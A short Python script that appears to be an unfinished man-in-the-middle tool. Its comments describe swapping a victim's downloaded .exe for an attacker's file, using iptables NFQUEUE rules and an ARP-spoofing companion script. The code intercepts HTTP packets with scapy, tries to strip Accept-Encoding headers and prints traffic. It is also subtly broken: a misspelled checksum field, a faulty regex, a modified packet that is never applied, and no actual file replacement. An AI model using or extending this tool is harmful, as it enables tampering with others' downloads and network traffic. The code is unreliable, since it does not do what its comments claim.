#!/usr/bin/env python

# This script replaces the downloading .exe with the file in hacker machine

# Run from the Linux machine with netfilterqueue python module
# Run the linux command first to capture local input and output traffic -
# iptables -I INPUT -j NFQUEUE ---queue-num 0
# iptables -I OUTPUT -j NFQUEUE ---queue-num 0
# Run the linux command if the target is a remote machine
# iptables -I FORWARD -j NFQUEUE ---queue-num 0
# Also run the arp_spoof.py for remote machine
# When done, run - iptables --flush

import netfilterqueue
import scapy.all as scapy
import re

ack_list =[]

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chkxum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport ==80:
            print("[+] Request")
            modified_load = re.sub("Accept-Encoding:,*?\\r\\n", '', scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)

            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            print(scapy_packet.show())

    packet.accept()

queue =  netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

